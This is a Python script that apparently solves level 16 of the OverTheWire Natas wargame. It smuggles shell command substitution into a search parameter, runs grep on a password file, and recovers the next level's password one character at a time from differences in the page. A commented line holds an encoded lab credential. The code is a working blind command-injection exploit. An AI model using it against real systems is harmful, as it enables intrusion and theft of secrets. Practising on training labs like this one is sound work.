import requests
import string
from requests.auth import HTTPBasicAuth

def solve16(username, password):
    session = requests.session()
    #session.headers["Authorization"] = "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
    session.auth = HTTPBasicAuth(username, password)
    def getURL(command):
        return f"http://natas16.natas.labs.overthewire.org/?needle=August$({command})&submit=Search"


    possibleLetters = string.ascii_letters + "0123456789"
    lettersContained = ""
    for letter in possibleLetters:
        resp = session.get(getURL(f"grep {letter} /etc/natas_webpass/natas17"))
        if "August" not in resp.text:
            lettersContained += letter

    password = ""
    foundLetter = True
    while foundLetter:
        foundLetter = False
        for letter in lettersContained:
            resp = session.get(getURL(f"grep ^{password}{letter} /etc/natas_webpass/natas17"))
            if "August" not in resp.text:
                foundLetter = True
                print(letter, end="")
                password += letter
                break
    return password

